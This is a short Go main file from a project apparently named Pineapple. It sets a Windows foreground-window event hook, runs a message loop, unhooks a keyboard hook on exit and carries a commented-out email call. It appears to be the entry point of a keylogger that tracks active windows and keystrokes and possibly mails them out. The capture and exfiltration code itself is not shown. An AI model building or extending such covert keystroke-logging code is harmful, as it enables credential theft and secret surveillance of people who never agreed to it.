package main

import (
	"fmt"
	"os"

	"github.com/MShoaei/Pineapple/utils"
	"github.com/MShoaei/Pineapple/windows"
)

func main() {
	utils.WndHook, _ = windows.SetWinEventHook(windows.EVENT_SYSTEM_FOREGROUND, windows.EVENT_SYSTEM_FOREGROUND, 0, utils.Window, 0, 0, windows.WINEVENT_SKIPOWNPROCESS)
	defer windows.UnhookWinEvent(utils.WndHook)
	defer windows.UnhookWindowsHookEx(utils.KbdHook)
	// defer email()
	msg := windows.MSG{}
	for bRet := windows.GetMessageW(&msg, 0, 0, 0); bRet != 0; bRet = windows.GetMessageW(&msg, 0, 0, 0) {
		if bRet == -1 {
			fmt.Println("encountered an error")
			os.Exit(-1)
		}
	}
	os.Exit(int(msg.WParam))
}
